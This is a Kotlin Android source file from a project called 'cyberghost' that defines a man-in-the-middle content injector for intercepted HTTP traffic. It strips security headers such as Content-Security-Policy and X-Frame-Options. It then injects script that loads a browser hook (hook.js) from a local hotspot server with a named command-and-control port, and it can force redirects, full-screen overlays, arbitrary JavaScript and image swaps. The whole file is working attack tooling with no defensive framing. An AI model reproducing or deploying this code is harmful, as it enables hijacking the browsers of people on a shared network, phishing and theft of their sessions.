package com.cyberghost.core

import android.util.Log
import java.nio.charset.StandardCharsets

data class InjectionConfig(
    var hookEnabled: Boolean = true,
    var audioUrl: String? = null,
    var videoUrl: String? = null,
    var documentUrl: String? = null,
    var redirectUrl: String? = null,
    var customJs: String? = null,
    var customHtml: String? = null,
    var imageSwapMap: Map<String, String> = emptyMap(),
    var headerOverrides: Map<String, String> = emptyMap()
)

class ContentInjector(
    private val mediaServerHost: String = "192.168.43.1",
    private val mediaServerPort: Int = 9090,
    private val c2Port: Int = 9091
) {
    var config = InjectionConfig()

    fun inject(packet: InterceptedPacket): InterceptedPacket {
        try {
            val contentType = packet.headers["Content-Type"] ?: packet.headers["content-type"] ?: ""
            if (!contentType.contains("text/html", ignoreCase = true)) return maybeSwapImage(packet)
            config.headerOverrides.forEach { (k, v) -> packet.headers[k] = v }
            listOf("Content-Security-Policy", "content-security-policy", "X-Content-Type-Options",
                "x-content-type-options", "X-Frame-Options", "x-frame-options").forEach { packet.headers.remove(it) }
            var html = String(packet.body, StandardCharsets.UTF_8)
            val payload = buildPayload()
            if (payload.isNotEmpty()) html = injectBeforeClose(html, payload)
            packet.body = html.toByteArray(StandardCharsets.UTF_8)
            packet.headers["Content-Length"] = packet.body.size.toString()
        } catch (e: Exception) {
            Log.e("CG2", "Injection failed", e)
        }
        return packet
    }

    private fun buildPayload(): String {
        val sb = StringBuilder()
        sb.append("<!-- CG2 -->\n<script>\n")
        if (config.hookEnabled) {
            sb.append("(function(){if(window.__cg2_hooked)return;window.__cg2_hooked=true;")
            sb.append("var s=document.createElement('script');")
            sb.append("s.src='http://$mediaServerHost:$mediaServerPort/hook.js';")
            sb.append("document.head.appendChild(s);")
            sb.append("})();\n")
        }
        config.audioUrl?.let { sb.append("(function(){var a=new Audio('$it');a.volume=1.0;document.addEventListener('click',function(){a.play()},{once:true});try{a.play()}catch(e){}})();\n") }
        config.videoUrl?.let { sb.append("(function(){var d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.9);z-index:999999;display:flex;align-items:center;justify-content:center;';var v=document.createElement('video');v.src='$it';v.autoplay=true;v.controls=true;v.style.cssText='max-width:90vw;max-height:90vh;';var c=document.createElement('span');c.textContent='\\u2715';c.style.cssText='position:absolute;top:20px;right:20px;color:#fff;font-size:30px;cursor:pointer;';c.onclick=function(){d.remove()};d.appendChild(v);d.appendChild(c);document.body.appendChild(d);})();\n") }
        config.documentUrl?.let { sb.append("(function(){var d=document.createElement('div');d.style.cssText='position:fixed;top:5vh;left:5vw;width:90vw;height:90vh;z-index:999999;background:#fff;border:2px solid #333;box-shadow:0 0 20px rgba(0,0,0,0.5);';var f=document.createElement('iframe');f.src='$it';f.style.cssText='width:100%;height:calc(100% - 40px);border:none;';var h=document.createElement('div');h.style.cssText='height:40px;background:#222;display:flex;align-items:center;justify-content:flex-end;padding:0 10px;';var c=document.createElement('span');c.textContent='Close';c.style.cssText='color:#fff;cursor:pointer;font-size:14px;';c.onclick=function(){d.remove()};h.appendChild(c);d.appendChild(h);d.appendChild(f);document.body.appendChild(d);})();\n") }
        config.redirectUrl?.let { sb.append("window.location='$it';\n") }
        config.customJs?.let { sb.append(it); sb.append("\n") }
        sb.append("</script>\n")
        config.customHtml?.let { sb.append(it); sb.append("\n") }
        return sb.toString()
    }

    private fun injectBeforeClose(html: String, payload: String): String {
        val bodyClose = html.lastIndexOf("</body>", ignoreCase = true)
        return if (bodyClose >= 0) html.substring(0, bodyClose) + payload + html.substring(bodyClose) else html + payload
    }

    private fun maybeSwapImage(packet: InterceptedPacket): InterceptedPacket {
        if (config.imageSwapMap.isEmpty()) return packet
        val requestUrl = "${packet.host}${packet.path}"
        config.imageSwapMap.entries.forEach { (original, replacement) ->
            if (requestUrl.contains(original)) { packet.headers["Location"] = replacement; packet.body = ByteArray(0); return packet }
        }
        return packet
    }
}
